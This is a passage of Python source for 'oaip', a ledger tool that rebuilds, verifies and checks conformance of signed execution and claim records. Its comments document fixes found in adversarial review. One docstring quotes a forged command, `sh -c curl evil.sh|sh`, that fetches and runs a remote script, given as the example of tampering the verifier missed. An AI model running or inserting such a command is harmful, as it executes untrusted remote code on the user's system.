            con0.close()
        except sqlite3.Error:
            prev_edges = set()          # unreadable: nothing to compare against

    if art_bad or store_bad:
        for e in art_bad + store_bad:
            print("ERR ", e, file=sys.stderr)
        where = ", ".join(
            p for p in (f"{len(art_bad)} corrupt artifact(s) in {ART}" if art_bad
                        else "",
                        f"{len(store_bad)} fault(s) in the decision layer "
                        f"({WSTORE})" if store_bad else "") if p)
        mark_untrusted(art_bad + store_bad)
        sys.exit(f"refusing to rebuild: {where} — the projection would assert "
                 "facts the canonical layer does not support. The existing "
                 f"projection is left on disk but MARKED UNTRUSTED ({UNTRUSTED}): "
                 "`oaip log` and `oaip verify` will refuse it until a rebuild "
                 "succeeds.")

    # BUILD UNDER A TEMPORARY NAME, THEN RENAME (F10). The old code deleted
    # `ledger.db` and rebuilt in place, so between those two moments there was no
    # projection at all — and a second rebuild racing the first hit
    # FileNotFoundError on the unlink. `os.replace` is atomic on POSIX: a reader
    # sees the old projection or the new one, never neither.
    tmp_db = OAIP / "ledger.rebuild.db"
    tmp_db.unlink(missing_ok=True)
    con = db(tmp_db)
    con.executescript(SCHEMA)       # one schema definition, not a copy of it
    # Deterministic order: by timestamp then id, so a rebuild is reproducible and
    # two rebuilds of the same artifacts give the same projection.
    records.sort(key=lambda d: (d.get("ts", 0), d.get("id", "")))
    counts = {"intent@v1": 0, "execution@v1": 0, "claim@v1": 0}
    for d in records:
        kind = d["oaip_record"]
        if kind == "intent@v1":
            con.execute("INSERT OR REPLACE INTO intents(id,description,parent_id,created_at)"
                        " VALUES (?,?,?,?)", (d["id"], d.get("description"),
                                              d.get("parent"), d.get("ts")))
        elif kind == "execution@v1":
            con.execute("""INSERT OR REPLACE INTO executions(id,intent_id,command,exit_code,
                           before_tree,after_tree,env_fp,stdout_hash,created_at)
                           VALUES (?,?,?,?,?,?,?,?,?)""",
                        (d["id"], d.get("intent"), d.get("command"), d.get("exit_code"),
                         d.get("before_tree"), d.get("after_tree"), d.get("env_fp"),
                         d.get("stdout"), d.get("ts")))
            for e in d.get("effects", []):
                cur = con.execute("""INSERT INTO effects(execution_id,path,status,
                                     before_blob,after_blob) VALUES (?,?,?,?,?)""",
                                  (d["id"], e.get("path"), e.get("status"),
                                   e.get("before"), e.get("after")))
                at = e.get("attribution") or {}
                if at:
                    con.execute("""INSERT INTO attributions(effect_id,cause,method,
                                   confidence_ppm) VALUES (?,?,?,?)""",
                                (cur.lastrowid, at.get("cause"), at.get("method"),
                                 at.get("confidence_ppm")))
        elif kind == "claim@v1":
            con.execute("""INSERT OR REPLACE INTO claims(id,execution_id,predicate,check_cmd,
                           check_exit,transcript_hash,subject_hash,supported,created_at)
                           VALUES (?,?,?,?,?,?,?,?,?)""",
                        (d["id"], d.get("execution"), d.get("predicate"), d.get("check"),
                         d.get("check_exit"), d.get("transcript"), d.get("subject"),
                         1 if d.get("supported") else 0, d.get("ts")))
        else:
            continue
        counts[kind] = counts.get(kind, 0) + 1
    # The claim→warrant edge, from the store records validated AND verified
    # above. Sorted filename order is deterministic, so two rebuilds agree
    # (same property the ts/id sort gives the artifact records).
    #
    # THE LINK IS EXPLICIT, AND MANDATORY (2026-07-30 adversarial review, both
    # rounds). The claim subject {predicate, execution, effects} excludes the
    # check command and the verdict, so a `--check true` claim and a `--check
    # false` claim over the same execution have IDENTICAL subject hashes — and
    # deriving the edge by subject hash projected one real signed acceptance onto
    # the FAILED claim too, changing the graph across rebuild (§5 MUST
    # violation). Accepts carry the accepted claim's id in subject.note
    # ("oaip-claim:<id>", inside the signed body) and rebuild follows that.
    #
    # ROUND TWO: the fallback for note-less records was ATTACKER-SELECTABLE.
    # "Has no note" is the writer's choice, and `note.startswith("oaip-claim:")`
    # made even the prefix's LETTER CASE the writer's choice. Reproduced: two
    # accepts filed directly with this project's own real key, one with no note
    # and one noted `OAIP-CLAIM:<id>`, both took the fallback, both produced an
    # edge, and `oaip verify` reported 0 errors. So:
    #   * the prefix is matched case-insensitively — a case variant can no longer
    #     downgrade anything, it simply IS the explicit link; and
    #   * the fallback is OFF unless BOTH (a) the operator passes
    #     --allow-legacy-links, and (b) the record predates this store's note
    #     convention per `.oaip/store.json` (see note_convention_since) — a
    #     criterion stamped by `init`, which the filer of a record cannot choose.
    claims_by_id = {d["id"]: d for d in records
                    if d["oaip_record"] == "claim@v1" and d.get("id")}
    supported_by_subject = {}
    claim_subjects = set()
    for d in records:
        if d["oaip_record"] == "claim@v1" and d.get("subject"):
            claim_subjects.add(d["subject"])
            if d.get("supported"):
                supported_by_subject.setdefault(d["subject"], []).append(d["id"])
    cutoff = note_convention_since()
    counts["warrant@edge"] = 0

    derived, refused_why = set(), {}

    def edge(cid, wid, wts):
        cur = con.execute("INSERT OR IGNORE INTO warrants(claim_id,warrant_id,"
                          "created_at) VALUES (?,?,?)", (cid, wid, wts))
        counts["warrant@edge"] += cur.rowcount or 0
        derived.add((cid, wid))

    assess_signer = signer_gate(report, actors, unbound_sigs)

    for acc in accepts:
        subj_hash, wid, wts, note = (acc["subject"], acc["wid"], acc["ts"],
                                     acc["note"])
        # WHO ACCEPTED, before WHAT was accepted. An acceptance whose named actor
        # did not sign it — or signed with a key nobody vouches for — is not that
        # actor's decision, however well-formed the rest of the record is (F7).
        why, notes = assess_signer(wid, acc["env"])
        for n in notes:
            # Reported, never fatal: §5 lets anyone append a co-signature, so a
            # co-signature must not be able to delete a decision (C2-F1b).
            print(f"NOTE  accept {wid[:12]}: {n}", file=sys.stderr)
        if why is not None:
            refused_why[wid] = why
            print(f"WARN  accept {wid[:12]}: {why} — no valid signature by a key "
                  "bound to the actor this record NAMES, so this is not that "
                  "actor's decision; no acceptance edge derived (`oaip bind "
                  "--actor <id>` if the key really is this ledger's)",
                  file=sys.stderr)
            continue
        if note[:len(NOTE_PREFIX)].lower() == NOTE_PREFIX:
            cid = note[len(NOTE_PREFIX):]
            c = claims_by_id.get(cid)
            if c is None:
                refused_why[wid] = (f"it names claim {cid}, which is no longer "
                                    "in the canonical layer")
                print(f"WARN  accept {wid[:12]} names claim {cid} — no such "
                      "claim record in the canonical layer; edge not derived",
                      file=sys.stderr)
            elif c.get("subject") != subj_hash:
                refused_why[wid] = (f"it names claim {cid} but carries a "
                                    "different subject than that claim's")
                print(f"WARN  accept {wid[:12]} names claim {cid} but the "
                      "warrant's subject is not that claim's subject; edge "
                      "not derived", file=sys.stderr)
            elif not c.get("supported"):
                refused_why[wid] = (f"it names claim {cid}, whose own validation "
                                    "check FAILED")
                print(f"WARN  accept {wid[:12]} names claim {cid} whose own "
                      "check FAILED; cmd_accept would refuse it, so rebuild "
                      "refuses the edge", file=sys.stderr)
            else:
                edge(cid, wid, wts)
        elif subj_hash not in claim_subjects:
            # Not an OAIP claim acceptance at all. A Warrant store legitimately
            # holds other decisions — root adoption, key rotation, anything the
            # operator files with the same CLI — and emitting a forgery-adjacent
            # warning about them on every rebuild was a false accusation, made
            # repeatedly (F14).
            pass
        elif not allow_legacy:
            print(f"WARN  accept {wid[:12]} is about an OAIP claim's subject but "
                  "carries no oaip-claim:<id> note, so WHICH claim it accepted "
                  "is not recorded — and the subject alone cannot say (two "
                  "claims with opposite verdicts over one execution share it). "
                  "No edge derived. Pass --allow-legacy-links to fall back to "
                  "subject-hash matching for records that predate the note "
                  "convention.", file=sys.stderr)
        elif cutoff is not None and not (isinstance(wts, int) and wts < cutoff):
            print(f"WARN  accept {wid[:12]} carries no oaip-claim:<id> note but "
                  f"was filed at ts={wts}, at or after this store began "
                  f"requiring one (ts={cutoff}, {STOREMETA}). It is not a legacy "
                  "record; --allow-legacy-links does not cover it and no edge is "
                  "derived.", file=sys.stderr)
        else:
            cids = supported_by_subject.get(subj_hash, [])
            print(f"WARN  --allow-legacy-links: accept {wid[:12]} carries no "
                  f"explicit claim link; GUESSING by subject hash -> "
                  f"{len(cids)} supported claim(s). This can attach one signed "
                  "acceptance to a claim its signer never accepted, because the "
                  "claim subject excludes the check command and the verdict. "
                  "Only records filed before "
                  + (f"ts={cutoff}" if cutoff is not None
                     else "this store had a format marker")
                  + " are eligible.", file=sys.stderr)
            for cid in cids:
                edge(cid, wid, wts)
    # Re-register the artifacts themselves, so the index over the canonical layer
    # is complete rather than only covering what the records referenced.
    #
    # THE KIND IS RE-DERIVED, NOT OVERWRITTEN (F15, 2026-07-30, second review
    # round). This loop used to insert every artifact as kind "rebuilt", which
    # DESTROYED "record:intent" / "record:execution" / "record:claim" /
    # "claim-subject" / "stdout" / "check-transcript" on a CLEAN, honest store —
    # a real post-rebuild difference in the graph §5 says must be identical. The
    # test could not see it: `TABLES` omitted `artifacts` (7 tables exist, 6 were
    # compared), the same "the comparison couldn't see the loss" pattern that
    # earlier hid the missing claim→warrant edge.
    #
    # The kinds are recovered from what the records SAY, replayed in the order the
    # live path writes them. Order matters because `put_artifact` is INSERT OR
    # IGNORE and two artifacts can share one address — an empty stdout and an
    # empty check transcript hash alike, which is the common case for a quiet
    # command — so the FIRST writer's kind is the one that stands. `cmd_run` puts
    # stdout, then the execution record; `cmd_claim` puts the transcript, then the
    # subject, then the claim record. `records` is already sorted by (ts, id), so
    # mentioning each record's referents in that same order reproduces the live
    # projection exactly rather than approximately.
    kinds = {}
    for d in records:
        k = d["oaip_record"]
        if k == "execution@v1" and isinstance(d.get("stdout"), str):
            kinds.setdefault(d["stdout"], "stdout")
        elif k == "claim@v1":
            if isinstance(d.get("transcript"), str):
                kinds.setdefault(d["transcript"], "check-transcript")
            if isinstance(d.get("subject"), str):
                kinds.setdefault(d["subject"], "claim-subject")
        addr = rec_addr.get(id(d))
        if addr:
            kinds.setdefault(addr, "record:" + k.split("@")[0])
    for path in sorted(ART.glob("*")):
        # "unreferenced" only for a blob no record explains — which the live path
        # cannot produce, since `put_artifact` always names a kind. Saying
        # "rebuilt" for everything was the defect; saying it for nothing that has
        # a real kind is the fix.
        con.execute("INSERT OR IGNORE INTO artifacts(hash,kind,size) VALUES (?,?,?)",
                    (path.name, kinds.get(path.name, "unreferenced"),
                     path.stat().st_size))
    con.commit()
    con.close()
    os.replace(tmp_db, DB)          # atomic: never a moment with no projection
    UNTRUSTED.unlink(missing_ok=True)   # this projection WAS derived; it stands
    print("rebuilt projection from the canonical layer: "
          + ", ".join(f"{k.split('@')[0]}={v}" for k, v in sorted(counts.items())))

    # A DROPPED EDGE IS NOT A SUCCESSFUL REBUILD (C2-F1b, third adversarial
    # round). §5's "the same graph" is the promise; when the rebuild cannot keep
    # it, the exit status must not say otherwise. The new projection stands —
    # it is what the canonical layer actually supports — and the loss is named,
    # edge by edge, with the reason the derivation refused it.
    dropped = sorted(prev_edges - derived)
    if dropped:
        for cid, wid in dropped:
            why = refused_why.get(wid, "the accept record is no longer in the "
                                       "store, or no longer names this claim")
            print(f"ERR   this rebuild LOST an acceptance edge the previous "
                  f"projection asserted: claim {cid} -> warrant {wid[:12]} — "
                  f"{why}", file=sys.stderr)
        sys.exit(f"rebuilt, but {len(dropped)} acceptance edge(s) the previous "
                 "projection asserted are NOT derivable from this canonical "
                 "layer. The new projection is in place and no longer asserts "
                 "them; that is a change to the graph, not a successful "
                 "reconstruction.")


def verify_artifacts():
    """Every artifact's bytes must hash to its filename, and every record must be
    canonical I-JSON. Returns a list of errors.

    Also: every hash the projection CITES must resolve. A dangling citation means
    the projection asserts a fact whose evidence is absent — reporting the graph
    as intact then is the same mistake as trusting a filename.
    """
    errs = []
    if not ART.is_dir():
        return [f"no canonical layer at {ART}"]
    present = set()
    for path in sorted(ART.glob("*")):
        doc, err = read_artifact(path)
        if err:
            errs.append(err)
        else:
            present.add(path.name)

    if DB.is_file():
        con = db()
        con.row_factory = sqlite3.Row
        cited = []
        for row in con.execute("SELECT hash FROM artifacts"):
            cited.append(("artifacts.hash", row[0]))
        for row in con.execute("SELECT id,subject_hash,transcript_hash FROM claims"):
            cited.append((f"claim {row[0]}.subject", row[1]))
            cited.append((f"claim {row[0]}.transcript", row[2]))
        for where, h in cited:
            if h and h not in present:
                errs.append(f"{where} cites {h[:12]} — not resolvable in the "
                            "canonical layer")
    return errs


def cmd_verify(_):
    """Verify the canonical layer FIRST, then the decision layer.

    WHAT THIS USED TO DO, AND WHY IT WAS WRONG
    ------------------------------------------
    It shelled out to `warrant verify` on `.oaip/warrants` and printed the last
    line — nothing else. Not one byte of `.oaip/artifacts` was examined, though
    SPEC §5 calls that layer the truth. Demonstrated 2026-07-30: with all three
    canonical records forged (`command` rewritten to `sh -c curl evil.sh|sh`),
    `oaip verify` printed "0 errors" and exited 0. It was checking the store next
    door to the evidence — a real, adjacent, healthy thing — and reporting that
    as the health of this one.

    AND WHY IT WAS STILL WRONG AFTER THAT
    -------------------------------------
    It reported `warrant verify`'s last line, and `warrant verify` exits 0 for an
    acceptance signed by a key nobody vouches for — Warrant reports an unverified
    key↔actor binding as a WARN by SPECIFICATION (§5). So `oaip verify` printed
    "0 errors" for a store in which an attacker-generated key had accepted a claim
    as `tester@local` (2026-07-30, second review round). An acceptance whose signer
    is unknown is now an OAIP-level ERROR — for the accepts that claim to be
    OAIP's; a Warrant store may legitimately hold OTHER decisions (root adoption,
    key rotation) that this ledger has no business vouching for.
    """
    errs = verify_artifacts()
    for e in errs:
        print("ERR ", e)
    print(f"canonical layer: {len(errs)} error(s)" if errs
          else "canonical layer: every artifact matches its address")

    # The projection is a THIRD thing, named as itself: a fault here is neither
    # the canonical layer's nor the decision layer's, and this file has already
    # been wrong once by reporting one layer's health as another's.
    proj_errs = []
    why = untrusted_reason()
    if why is not None:
        # The projection outlived a refusal, so it may still assert facts this
        # canonical layer does not support. Reporting it as healthy is how a
        # forged edge stayed readable as "(signed decision)" forever (C2-F1a).
        proj_errs.append(f"projection {DB}: MARKED UNTRUSTED — a rebuild refused "
                         "this canonical layer, and the projection predates that "
                         f"refusal ({why}). Rebuild before believing it.")
    for e in proj_errs:
        print("ERR ", e)
    print(f"projection:      {len(proj_errs)} error(s)" if proj_errs
          else "projection:      derived (no refused rebuild since)")

    accepts, wrec_files, store_errs = read_warrant_store()
    report, rerr = store_report() if wrec_files else (None, None)
    for e in store_errs:
        print("ERR ", e)
    if rerr:
        print("ERR  decision layer: " + rerr)
    dec_errs = list(store_errs) + ([rerr] if rerr else [])
    if report:
        actors, aerr = read_trust()
        if aerr:
            print("ERR ", aerr)
            dec_errs.append(aerr)
        else:
            assess_signer = signer_gate(report, actors, unbound_by_warrant())
            for acc in accepts:
                if not acc["note"].lower().startswith(NOTE_PREFIX):
                    continue        # not an OAIP claim acceptance; not ours to judge
                why, notes = assess_signer(acc["wid"], acc["env"])
                for n in notes:
                    # A co-signature is a fact about the record worth printing,
                    # and not an error: §5 permits appending one (C2-F1b).
                    print(f"NOTE  accept {acc['wid'][:12]}: {n}")
                if why is not None:
                    msg = (f"accept {acc['wid'][:12]} claims an OAIP claim but no "
                           "key bound to the actor it names signed it: "
                           f"{why}")
                    print("ERR ", msg)
                    dec_errs.append(msg)
        print(f"decision layer:  {report['records']} records, "
              f"{report['errors'] + len(dec_errs)} error(s), "
              f"{report['warnings']} warning(s)"
              + ("" if report["errors"] == 0 else "  [Warrant]"))
    elif not wrec_files:
        print("decision layer:  (empty store)")
    sys.exit(1 if (errs or dec_errs or proj_errs
                   or (report and report["errors"])) else 0)


def cmd_conformance(a):
    """SPEC §1: every OAIP record MUST canonicalize (JCS, Warrant §4) to the pinned
    bytes and identity. Recompute canon over each vector and compare byte-exact."""
    doc = json.loads(Path(a.vectors).read_text(encoding="utf-8"))
    ok = 0
    total = 0
    for v in doc["records"]:
        total += 1
        got = canon(v["record"])
        good = got.hex() == v["canon_hex"] and sha256(got) == v["canon_sha256"]
        print(("OK  " if good else "FAIL"), v["name"], "" if good else f"got {sha256(got)[:12]}")
        ok += good

    # The negative half. An implementation that accepts everything passes every
    # positive vector, so agreement on well-formed records establishes nothing
    # about whether two implementations share a domain (SPEC §1).
    for v in doc.get("reject", []):
        total += 1
        raw = bytes.fromhex(v["bytes_hex"])
        try:
            loads_ijson(raw)
            rejected, why = False, "ACCEPTED — must be refused"
        except (ValueError, UnicodeDecodeError) as e:
            rejected, why = True, str(e)
        print(("OK  " if rejected else "FAIL"), f"reject/{v['class']}/{v['name']}",
              "" if rejected else why)
        ok += rejected

    tag = "ALL PASS" if ok == total else "FAILURES"
    print(f"\nOAIP-CONFORMANCE: {tag} ({ok}/{total})")
    sys.exit(0 if ok == total else 1)


def main():
    ap = argparse.ArgumentParser(prog="oaip", description=__doc__.splitlines()[0])
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("init").set_defaults(fn=cmd_init)
    pi = sub.add_parser("intent"); pi.add_argument("description"); pi.add_argument("--parent"); pi.set_defaults(fn=cmd_intent)
    pr = sub.add_parser("run"); pr.add_argument("--intent"); pr.add_argument("command", nargs=argparse.REMAINDER); pr.set_defaults(fn=cmd_run)
    pc = sub.add_parser("claim"); pc.add_argument("--execution", required=True); pc.add_argument("--predicate", required=True); pc.add_argument("--check", required=True); pc.set_defaults(fn=cmd_claim)
    pa = sub.add_parser("accept"); pa.add_argument("--claim", required=True); pa.add_argument("--actor", required=True); pa.set_defaults(fn=cmd_accept)
    pb = sub.add_parser("bind", help="vouch that a key may sign as an actor "
                        "(rebuild derives no acceptance edge from an unbound signer)")
    pb.add_argument("--actor", required=True)
    pb.add_argument("--key", help="hex64 Ed25519 public key; defaults to this "
                    "ledger's own key")
    pb.set_defaults(fn=cmd_bind)
    pd = sub.add_parser("do", help="one-shot: intent -> run -> validate -> accept-if-pass")
    pd.add_argument("--intent", required=True); pd.add_argument("--check", required=True)
    pd.add_argument("--predicate"); pd.add_argument("--actor", required=True)
    pd.add_argument("command", nargs=argparse.REMAINDER); pd.set_defaults(fn=cmd_do)
    sub.add_parser("log").set_defaults(fn=cmd_log)
    prb = sub.add_parser("rebuild",
                         help="reconstruct the projection from artifacts (SPEC s5)")
    prb.add_argument("--allow-legacy-links", action="store_true",
                     help="for accepts filed BEFORE this store began requiring an "
                          "oaip-claim:<id> note, guess which claim was accepted "
                          "from the subject hash. Unsafe by construction: the "
                          "subject excludes the check command and the verdict, so "
                          "one signed acceptance can be attached to a claim its "
                          "signer never accepted")
    prb.set_defaults(fn=cmd_rebuild)
    sub.add_parser("verify").set_defaults(fn=cmd_verify)
    pf = sub.add_parser("conformance"); pf.add_argument("vectors", nargs="?", default="examples/vectors.json"); pf.set_defaults(fn=cmd_conformance)
    a = ap.parse_args()
    if a.cmd in ("run", "do") and a.command and a.command[0] == "--":
        a.command = a.command[1:]
    a.fn(a)


if __name__ == "__main__":
    main()
